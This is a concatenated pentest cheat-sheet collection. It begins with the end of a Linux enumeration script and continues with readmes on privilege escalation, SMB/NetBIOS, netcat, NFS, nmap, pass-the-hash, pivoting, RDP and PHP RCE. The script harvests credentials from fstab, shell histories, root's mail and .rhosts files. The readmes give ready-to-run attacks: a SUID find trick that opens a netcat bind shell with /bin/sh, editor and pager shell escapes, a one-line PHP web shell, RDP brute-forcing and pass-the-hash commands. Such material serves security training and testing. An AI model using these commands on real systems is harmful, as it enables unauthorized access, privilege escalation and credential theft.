#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
postcon1=`psql -U postgres template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon1" ]; then
  echo -e "\e[00;33m***We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n$postcon1" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

postcon11=`psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon11" ]; then
  echo -e "\e[00;33m***We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n$postcon11" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

postcon2=`psql -U pgsql template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon2" ]; then
  echo -e "\e[00;33m***We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n$postcon2" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

postcon22=`psql -U pgsql template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon22" ]; then
  echo -e "\e[00;33m***We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n$postcon22" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#apache details - if installed
apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
if [ "$apachever" ]; then
  echo -e "\e[00;31mApache version:\e[00m\n$apachever" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#what account is apache running under
apacheusr=`cat /etc/apache2/envvars 2>/dev/null |grep -i 'user\|group' 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null`
if [ "$apacheusr" ]; then
  echo -e "\e[00;31mApache user configuration:\e[00m\n$apacheusr" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$apacheusr" ]; then
  mkdir --parents $format/etc-export/apache2/ 2>/dev/null
  cp /etc/apache2/envvars $format/etc-export/apache2/envvars 2>/dev/null
else
  :
fi

#installed apache modules
apachemodules=`apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null`
if [ "$apachemodules" ]; then
  echo -e "\e[00;31mInstalled Apache modules:\e[00m\n$apachemodules" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#anything in the default http home dirs
apachehomedirs=`ls -alhR /var/www/ 2>/dev/null; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache2/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null`
if [ "$apachehomedirs" ]; then
  echo -e "\e[00;31mAnything in the Apache home dirs?:\e[00m\n$apachehomedirs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### INTERESTING FILES ####################################\e[00m" |tee -a $report 2>/dev/null

#checks to see if various files are installed
echo -e "\e[00;31mUseful file locations:\e[00m" |tee -a $report 2>/dev/null; which nc 2>/dev/null |tee -a $report 2>/dev/null; which netcat 2>/dev/null |tee -a $report 2>/dev/null; which wget 2>/dev/null |tee -a $report 2>/dev/null; which nmap 2>/dev/null |tee -a $report 2>/dev/null; which gcc 2>/dev/null |tee -a $report 2>/dev/null
echo -e "\n" |tee -a $report 2>/dev/null

#limited search for installed compilers
compiler=`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
if [ "$compiler" ]; then
  echo -e "\e[00;31mInstalled compilers:\e[00m\n$compiler" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
 else
  :
fi

#manual check - lists out sensitive files, can we read/modify etc.
echo -e "\e[00;31mCan we read/write sensitive files:\e[00m" |tee -a $report 2>/dev/null; ls -la /etc/passwd 2>/dev/null |tee -a $report 2>/dev/null; ls -la /etc/group 2>/dev/null |tee -a $report 2>/dev/null; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null |tee -a $report 2>/dev/null; ls -la /etc/master.passwd 2>/dev/null |tee -a $report 2>/dev/null
echo -e "\n" |tee -a $report 2>/dev/null

#search for suid files - this can take some time so is only 'activated' with thorough scanning switch (as are all suid scans below)
if [ "$thorough" = "1" ]; then
findsuid=`find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$findsuid" ]; then
		echo -e "\e[00;31mSUID files:\e[00m\n$findsuid" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$findsuid" ]; then
		mkdir $format/suid-files/ 2>/dev/null
		for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null
	else
		:
	fi
  else
	:
fi

#list of 'interesting' suid files - feel free to make additions
if [ "$thorough" = "1" ]; then
intsuid=`find / -perm -4000 -type f 2>/dev/null | grep -w 'nmap\|perl\|'awk'\|'find'\|'bash'\|'sh'\|'man'\|'more'\|'less'\|'vi'\|'vim'\|'emacs'\|'nc'\|'netcat'\|python\|ruby\|lua\|irb\|pl' | xargs -r ls -la 2>/dev/null`
	if [ "$intsuid" ]; then
		echo -e "\e[00;33m***Possibly interesting SUID files:\e[00m\n$intsuid" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

#lists word-writable suid files
if [ "$thorough" = "1" ]; then
wwsuid=`find / -perm -4007 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwsuid" ]; then
		echo -e "\e[00;31mWorld-writable SUID files:\e[00m\n$wwsuid" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

#lists world-writable suid files owned by root
if [ "$thorough" = "1" ]; then
wwsuidrt=`find / -uid 0 -perm -4007 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwsuidrt" ]; then
		echo -e "\e[00;31mWorld-writable SUID files owned by root:\e[00m\n$wwsuidrt" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

#search for guid files - this can take some time so is only 'activated' with thorough scanning switch (as are all guid scans below)
if [ "$thorough" = "1" ]; then
findguid=`find / -perm -2000 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$findguid" ]; then
		echo -e "\e[00;31mGUID files:\e[00m\n$findguid" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$findguid" ]; then
		mkdir $format/guid-files/ 2>/dev/null
		for i in $findguid; do cp $i $format/guid-files/; done 2>/dev/null
	else
		:
	fi
  else
	:
fi

#list of 'interesting' guid files - feel free to make additions
if [ "$thorough" = "1" ]; then
intguid=`find / -perm -2000 -type f 2>/dev/null | grep -w 'nmap\|perl\|'awk'\|'find'\|'bash'\|'sh'\|'man'\|'more'\|'less'\|'vi'\|'emacs'\|'vim'\|'nc'\|'netcat'\|python\|ruby\|lua\|irb\|pl' | xargs -r ls -la 2>/dev/null`
	if [ "$intguid" ]; then
		echo -e "\e[00;33m***Possibly interesting GUID files:\e[00m\n$intguid" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

#lists world-writable guid files
if [ "$thorough" = "1" ]; then
wwguid=`find / -perm -2007 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwguid" ]; then
		echo -e "\e[00;31mWorld-writable GUID files:\e[00m\n$wwguid" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

#lists world-writable guid files owned by root
if [ "$thorough" = "1" ]; then
wwguidrt=`find / -uid 0 -perm -2007 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwguidrt" ]; then
		echo -e "\e[00;31mAWorld-writable GUID files owned by root:\e[00m\n$wwguidrt" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

#list all world-writable files excluding /proc
if [ "$thorough" = "1" ]; then
wwfiles=`find / ! -path "*/proc/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwfiles" ]; then
		echo -e "\e[00;31mWorld-writable files (excluding /proc):\e[00m\n$wwfiles" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wwfiles" ]; then
		mkdir $format/ww-files/ 2>/dev/null
		for i in $wwfiles; do cp --parents $i $format/ww-files/; done 2>/dev/null
	else
		:
	fi
  else
	:
fi

#are any .plan files accessible in /home (could contain useful information)
usrplan=`find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$usrplan" ]; then
  echo -e "\e[00;31mPlan file permissions and contents:\e[00m\n$usrplan" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$usrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $usrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
else
  :
fi

bsdusrplan=`find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$bsdusrplan" ]; then
  echo -e "\e[00;31mPlan file permissions and contents:\e[00m\n$bsdusrplan" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$bsdusrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $bsdusrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
else
  :
fi

#are there any .rhosts files accessible - these may allow us to login as another user etc.
rhostsusr=`find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostsusr" ]; then
  echo -e "\e[00;31mrhost config file(s) and file contents:\e[00m\n$rhostsusr" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$rhostsusr" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
else
  :
fi

bsdrhostsusr=`find /usr/home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$bsdrhostsusr" ]; then
  echo -e "\e[00;31mrhost config file(s) and file contents:\e[00m\n$bsdrhostsusr" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$bsdrhostsusr" ]; then
  mkdir $format/rhosts 2>/dev/null
  for i in $bsdrhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
else
  :
fi

rhostssys=`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostssys" ]; then
  echo -e "\e[00;31mHosts.equiv file details and file contents: \e[00m\n$rhostssys" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
  else
  :
fi

if [ "$export" ] && [ "$rhostssys" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostssys; do cp --parents $i $format/rhosts/; done 2>/dev/null
else
  :
fi

#list nfs shares/permisisons etc.
nfsexports=`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`
if [ "$nfsexports" ]; then
  echo -e "\e[00;31mNFS config details: \e[00m\n$nfsexports" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
  else
  :
fi

if [ "$export" ] && [ "$nfsexports" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/exports $format/etc-export/exports 2>/dev/null
else
  :
fi

#looking for credentials in /etc/fstab
fstab=`cat /etc/fstab 2>/dev/null |grep username |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; cat /etc/fstab 2>/dev/null |grep password |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; cat /etc/fstab 2>/dev/null |grep domain |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
if [ "$fstab" ]; then
  echo -e "\e[00;33m***Looks like there are credentials in /etc/fstab!\e[00m\n$fstab" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
  else
  :
fi

if [ "$export" ] && [ "$fstab" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
else
  :
fi

fstabcred=`cat /etc/fstab 2>/dev/null |grep cred |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
if [ "$fstabcred" ]; then
    echo -e "\e[00;33m***/etc/fstab contains a credentials file!\e[00m\n$fstabcred" |tee -a $report 2>/dev/null
    echo -e "\n" |tee -a $report 2>/dev/null
    else
    :
fi

if [ "$export" ] && [ "$fstabcred" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
else
  :
fi

#use supplied keyword and cat *.conf files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "Can't search *.conf files as no keyword was entered\n" |tee -a $report 2>/dev/null
  else
    confkey=`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$confkey" ]; then
      echo -e "\e[00;31mFind keyword ($keyword) in .conf files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$confkey" |tee -a $report 2>/dev/null
      echo -e "\n" |tee -a $report 2>/dev/null
     else
	echo -e "\e[00;31mFind keyword ($keyword) in .conf files (recursive 4 levels):\e[00m" |tee -a $report 2>/dev/null
	echo -e "'$keyword' not found in any .conf files" |tee -a $report 2>/dev/null
	echo -e "\n" |tee -a $report 2>/dev/null
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$confkey" ]; then
	  confkeyfile=`find / -maxdepth 4 -name *.conf -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/config_files/ 2>/dev/null
      for i in $confkeyfile; do cp --parents $i $format/keyword_file_matches/config_files/ ; done 2>/dev/null
    else
      :
  fi
fi

#use supplied keyword and cat *.log files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "Can't search *.log files as no keyword was entered\n" |tee -a $report 2>/dev/null
  else
    logkey=`find / -name *.log -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$logkey" ]; then
      echo -e "\e[00;31mFind keyword ($keyword) in .log files (output format filepath:identified line number where keyword appears):\e[00m\n$logkey" |tee -a $report 2>/dev/null
      echo -e "\n" |tee -a $report 2>/dev/null
     else
	echo -e "\e[00;31mFind keyword ($keyword) in .log files (recursive 2 levels):\e[00m" |tee -a $report 2>/dev/null
	echo -e "'$keyword' not found in any .log files"
	echo -e "\n" |tee -a $report 2>/dev/null
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$logkey" ]; then
      logkeyfile=`find / -name *.log -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
	  mkdir --parents $format/keyword_file_matches/log_files/ 2>/dev/null
      for i in $logkeyfile; do cp --parents $i $format/keyword_file_matches/log_files/ ; done 2>/dev/null
    else
      :
  fi
fi

#use supplied keyword and cat *.ini files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "Can't search *.ini files as no keyword was entered\n" |tee -a $report 2>/dev/null
  else
    inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$inikey" ]; then
      echo -e "\e[00;31mFind keyword ($keyword) in .ini files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$inikey" |tee -a $report 2>/dev/null
      echo -e "\n" |tee -a $report 2>/dev/null
     else
	echo -e "\e[00;31mFind keyword ($keyword) in .ini files (recursive 2 levels):\e[00m" |tee -a $report 2>/dev/null
	echo -e "'$keyword' not found in any .ini files" |tee -a $report 2>/dev/null
	echo -e "\n"
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$inikey" ]; then
	  inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/ini_files/ 2>/dev/null
      for i in $inikey; do cp --parents $i $format/keyword_file_matches/ini_files/ ; done 2>/dev/null
    else
      :
  fi
fi

#quick extract of .conf files from /etc - only 1 level
allconf=`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null`
if [ "$allconf" ]; then
  echo -e "\e[00;31mAll *.conf files in /etc (recursive 1 level):\e[00m\n$allconf" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$allconf" ]; then
  mkdir $format/conf-files/ 2>/dev/null
  for i in $allconf; do cp --parents $i $format/conf-files/; done 2>/dev/null
else
  :
fi

#extract any user history files that are accessible
usrhist=`ls -la ~/.*_history 2>/dev/null`
if [ "$usrhist" ]; then
  echo -e "\e[00;31mCurrent user's history files:\e[00m\n$usrhist" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$usrhist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  for i in $usrhist; do cp --parents $i $format/history_files/; done 2>/dev/null
 else
  :
fi

#can we read roots *_history files - could be passwords stored etc.
roothist=`ls -la /root/.*_history 2>/dev/null`
if [ "$roothist" ]; then
  echo -e "\e[00;33m***Root's history files are accessible!\e[00m\n$roothist" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$roothist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  cp $roothist $format/history_files/ 2>/dev/null
else
  :
fi

#is there any mail accessible
readmail=`ls -la /var/mail 2>/dev/null`
if [ "$readmail" ]; then
  echo -e "\e[00;31mAny interesting mail in /var/mail:\e[00m\n$readmail" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#can we read roots mail
readmailroot=`head /var/mail/root 2>/dev/null`
if [ "$readmailroot" ]; then
  echo -e "\e[00;33m***We can read /var/mail/root! (snippet below)\e[00m\n$readmailroot" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$readmailroot" ]; then
  mkdir $format/mail-from-root/ 2>/dev/null
  cp $readmailroot $format/mail-from-root/ 2>/dev/null
else
  :
fi

#specific checks - check to see if we're in a docker container
dockercontainer=`cat /proc/self/cgroup 2>/dev/null | grep -i docker 2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
if [ "$dockercontainer" ]; then
  echo -e "\e[00;33mLooks like we're in a Docker container:\e[00m\n$dockercontainer" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#specific checks - check to see if we're a docker host
dockerhost=`docker --version 2>/dev/null; docker ps -a 2>/dev/null`
if [ "$dockerhost" ]; then
  echo -e "\e[00;33mLooks like we're hosting Docker:\e[00m\n$dockerhost" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#specific checks - are we a member of the docker group
dockergrp=`id | grep -i docker 2>/dev/null`
if [ "$dockergrp" ]; then
  echo -e "\e[00;33mWe're a member of the (docker) group - could possibly misuse these rights!:\e[00m\n$dockergrp" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#specific checks - are there any docker files present
dockerfiles=`find / -name Dockerfile -exec ls -l {} 2>/dev/null \;`
if [ "$dockerfiles" ]; then
  echo -e "\e[00;31mAnything juicy in the Dockerfile?:\e[00m\n$dockerfiles" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#specific checks - are there any docker files present
dockeryml=`find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;`
if [ "$dockeryml" ]; then
  echo -e "\e[00;31mAnything juicy in docker-compose.yml?:\e[00m\n$dockeryml" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### SCAN COMPLETE ####################################\e[00m" |tee -a $report 2>/dev/null

#EndOfScript



---
File: /CheatSheets/linux/pos_xpl/readme.md
---

# Post-Exploitation on Linux

## Data Haversting and Enumaration

### Common users

`awk -F: '{ if($3 >= 1000) print $1}' passwd >> users` 

### Reading bash_history files

Mapping users directories

`ls /home/ > users_home`

Reading files

`for user in $(cat home_users); do echo $user; cat /home/$user/.bash_history ; echo -e "=====\n" ;done`

### Using great scripts

LinEnu.sh

wget [LinEnum.sh](https://raw.githubusercontent.com/kitsun3sec/Pentest-Cheat-Sheets/master/CheatSheets/pos_xpl/LinEnum.sh)

#### Upload it to the target and run through terminal

```bash
> chmod +x LinEnum.sh
> ./LinEnum.sh -t
```

#### Done, now pay attention to the output and see if there is anything *interesting*


## OTHERS SCRIPTS

* [LinuxPrivChecker](https://www.securitysift.com/download/linuxprivchecker.py)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
* [High Coffee](https://highon.coffee/downloads/linux-local-enum.sh)


---
File: /CheatSheets/linux/priv_esc/readme.md
---


# Privillege Escalation

### ry the obvious - Maybe the user can sudo to root:

`sudo su`

### List all SUID files 

`find / -perm -4000 2>/dev/null`

`find / -user root -perm -4000 -print 2>/dev/null`

`find / -perm -u=s -type f 2>/dev/null`

`find / -user root -perm -4000 -exec ls -ldb {} \;`

Nmap version [2.02 - 5.21]

`nmap -V`

`nmap --interactive`

`nmap> !sh`


### Performing privilege escalation by misconfigured SUID

#### Find

`touch kitsun3sec` && `find kitsun3sec -exec whoami \;`

if root

`find kitsun3sec -exec netcat -lvp 5555 -e /bin/sh \;`

#### vim.tiny 

` vim.tiny /etc/shadow `

```
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```

#### Bash

`bash -p`

`whoami`

#### Less

```
less /etc/passwd
!/bin/sh
```

### Listing process

`ps aux`

`ps xaf`

### Determine the current version of Linux 

`cat /etc/issue`

`lsb_release -a`

### Determine more information about the environment

`uname -a`

## Searchsploit

`searchsploit linux 2.6`

`searchsploit centos 6`


---
File: /CheatSheets/MSSQL/readme.md
---

# MS SQL

### Nmap Information Gathering

`nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`


---
File: /CheatSheets/mysql/readme.md
---

# MYSQL

### Try default Root access

`mysql -h Target_ip -u root`




---
File: /CheatSheets/NetBIOS/readme.md
---

# NetBIOS Recon & Enumaration

## Using WINDOWS Tools

### nbtstat

#### How to see the status of a server

`nbtstat -a <Target_ip>`

`nbtstat -a 10.10.1.100`

#### Whats is available there

`net view Target_IP`

`net view 10.10.1.100`

#### Explore it

net use < A_drive > \\Target_IP\SHARE_NAME

`net use K: \\10.10.1.100\Dados`

### nat

nat < -o output file > < -u userlist.txt > < -p passlist.txt> < IP_Address/RANGE >

`nat -o netbios_output.txt -u usernames.txt -p rockyou.txt 10.10.1.100`

### winfo

#### NUll Session

`winfo < IP_Address > (-v verbose) (-n Null Session)`

#### Enumarate

`winfo < IP_Address> -u`

## Using UNIX Tools

### nbtscan

`nbtscan -r 172.16.1.0/24`

### smblcient

NUll Session

`smbclient -L //172.168.1.5 -N`

No Password but with User

`smbclient -L //172.168.1.5 -N -U Administrator`

`smbclient //172.168.1.5/path -N` 

`smbclient //172.168.1.5/path -U DOMAIN\\administrator`

### rpcclient

`rpcclient -U  "" -N 172.16.1.5`

`rpcclient -u "Administrator" -N 17.16.1.5` 

Commands
enumdomusers
netshareenum
netshareenumall
querydominfo
lookupname root
queryuser john

### Enum4linux

All info

`enum4linux -a 172.16.1.5`

With User and blank pass

`enum4linux -a -u administrator -p "" 172.16.1.5`

### NMAP NSE

### SMB OS Discovery

`nmap 172.20.10.5 --script smb-os-discovery`

`nmap -v --script=smb-enum-shares 172.166.1.5`

### show SMB scripts and

`ls /usr/share/nmap/scripts | grep smb `



---
File: /CheatSheets/netcat/readme.md
---

# Netcat

## Port Scanner

One port
`nc -vnz <IP> <PORT>`

`nc -nvz 192.168.1.23 80`

Port Range
`nc -vnz 192.168.1.23 0-1000`

## Send files

* Server

`nc -lvp 1234 > file`

* Client

`nc -vn <server_IP> <port> < File_to_send`

`nc -vn 192.168.1.33 1234 < file_to_send`

## Executing remote script

* Server

`nc -lvp 1234 -e ping.sh <IP>`

* Client

`nc -vn 192.168.1.33 1234` 


## Chat with encryption

* Server
`ncat -nlvp 8000 --ssl`

* Client
`ncat -nv 192.168.1.33 8000`

## Banner Grabbing

```
nc target port
HTTP_Verb path http/version
Host: url
```

```
nc www.bla.com.br 80
HEAD / HTTP/1.0
Host: www.bla.com.br
```

##### If this site uses https you need to use openssl

Example:

 `Openssl s_client -quiet www.bla.com.br:443`





---
File: /CheatSheets/NFS/readme.md
---

# NFS - Network File System

### Nmap Show Mountable NFS Shares

`nmap -sV --script=nfs-showmount 192.168.1.110`

### Show nfs

showmount -e target_IP

`showmout -e 192.168.1.110`

### Mount directory

`mkdir /mnt/name_folder `

`mount -t nfs target_ip:/ /mnt/name_folder -o nolock`

### nfspy

`sudo nfspy -o server=Target_IP:/home/Path,nfsport=2049/tcp,rw /tmp/path_to_Mount`






---
File: /CheatSheets/nmap/README.md
---

# NMAP CHEAT SHEETS

Set the ip address as a varible
`export ip=192.168.1.100`
`export netw=192.168.1.0/24`

### Detecting Live Hosts
Only Ip's

`nmap -sn -n $netw | grep for | cut -d" " -f5`

### Stealth Scan

`nmap -sS $ip`

Only Open Ports and Banner Grab

`nmap -n -Pn -sS $ip --open -sV`

Stealth scan using FIN Scan 

`nmap -sF $ip`

### Agressive scan

Without Ping scan, no dns resolution, show only open ports all and test All TCP Ports

`nmap -n -Pn -sS -A $ip --open -p-`

Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services

`nmap –v –sS –A –T4 $ip`

### OS FigerPrint

`nmap -O $ip`

### Quick Scan

`nmap -T4 -F $netw`

### Quick Scan Plus

`nmap -sV -T4 -O -F --version-light $netw`

### output to a file

`nmap -oN nameFile -p 1-65535 -sV -sS -A -T4 $ip`

### output to a file Plus

`nmap -oA nameFile -p 1-65535 -sV -sS -A -T4 $netw`

### Search NMAP scripts

`ls /usr/share/nmap/scripts/ | grep ftp`

* [Nmap Discovery](https://nmap.org/nsedoc/categories/discovery.html)



---
File: /CheatSheets/pass_the_hash/readme.md
---

# Pass the hash

## Smb pass the hash

### Tool:

[pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)


#### Listing shared folders

sudo pth-smbclient --user=<user> --pw-nt-hash -m smb3  -L <target_ip> \\\\<target_ip>\\ <hash>

`sudo pth-smbclient --user=user --pw-nt-hash -m smb3  -L 192.168.0.24 \\\\192.168.0.24\\ ljahdçjkhadkahdkjahsdlkjahsdlkhadklad`

#### Interactive smb shell

sudo pth-smbclient --user=<user> --pw-nt-hash -m smb3  \\\\<target_ip>\\shared_folder <hash>

`sudo pth-smbclient --user=user --pw-nt-hash -m smb3 \\\\192.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad`



---
File: /CheatSheets/pivoting/readme.md
---

# Pivoting
---

## VPNPivot

#### On attacker machine

`$ sudo pivots -i <iface> -p <port> -H <mac> -v`

* __iface__ - is the virtual interface for the vpn itself, as example openvpn often creates tap0 or tun0, you can choose whaterver you want, like pwn0;
* __mac__ - MAC address for the newly created device;
* __port__ - whatever unused port you want


#### On target machine

`$ sudo pivotc <attacker-ip> <previously defined port> <internal network gateway ip>`



---
File: /CheatSheets/RCE/README.md
---

# WEB Remote Code Execution

## Simple PHP RCE
`<? echo shell_exec($_GET['cmd']); ?>`




---
File: /CheatSheets/RDP/readme.md
---

# Remote Desktop Protocol

## xfreerdp
### Simple User Enumeration for Windows Target (kerberos based)

xfreerdp /v:<target_ip> -sec-nla /u:""

`xfreerdp /v:192.168.0.32 -sec-nla /u:""`

## login

xfreerdp /u:<user> /g:<domain> /p:<pass> /v:<target_ip>

`xfreerdp /u:administrator /g:grandbussiness /p:bla /v:192.168.1.34`

### Wordlist based bruteforce

### NCRACK

ncrack -vv --user/-U <username/username_wordlist> --pass/-P <password/password_wordlist> <target_ip>:3389

`ncrack -vv --user user -P wordlist.txt 192.168.0.32:3389`

### Crowbar

crowbar -b rdp <-u/-U user/user_wordlist> -c/-C <password/password_wordlist> -s <target_ip>/32 -v

`crowbar -b rdp -u user -C password_wordlist -s 192.168.0.16/32 -v`




---
File: /CheatSheets/RPC/readme.md
---

# RPC - Remote Procedure Call

### rpcclient

